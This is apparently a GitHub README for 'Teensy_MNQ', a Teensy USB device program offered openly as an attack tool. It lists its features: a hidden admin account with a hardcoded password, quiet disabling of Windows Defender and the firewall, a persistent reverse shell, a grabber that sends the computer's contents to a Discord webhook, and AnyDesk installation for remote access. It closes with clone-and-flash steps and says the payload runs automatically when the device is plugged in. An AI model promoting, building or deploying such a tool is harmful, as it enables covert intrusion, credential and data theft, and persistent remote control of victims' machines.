**Teensy_MNQ**

This repository contains a program for Teensy as well as configurations and installation instructions for handling the SD card.

**Features**

- 🔐 Creation of an admin account with password configuration (NagibAdmin, password: 12301230)
- 🛡️ Discreet and step-by-step deactivation of Windows Defender and Firewall
- 🔍 Automatic detection of the port to which the computer is connected to the Teensy and feedback for bidirectional communication with the Teensy
- ⏳ Persistence: if the user is not created, a delay is added, and the installation resumes from the beginning (quick)
- 🔄 Installation of a reverse shell with startup persistence
- 🎣 Installation of a grabber sending everything contained in the PC to a Discord webhook
- 🖥️ Installation of AnyDesk and retrieval of the ID

**Installation**

1. Clone this repository to your computer:

    ```
    git clone https://github.com/Naywvi/Teensy_MNQ.git
    ```

2. Copy and paste the code from the .ino file into the Arduino IDE and upload it to the Teensy.
3. Copy all the contents of the `Teensy_SD_CARD` folder onto the Teensy's SD card.

That's it! The program will run automatically once the Teensy is connected to a computer.
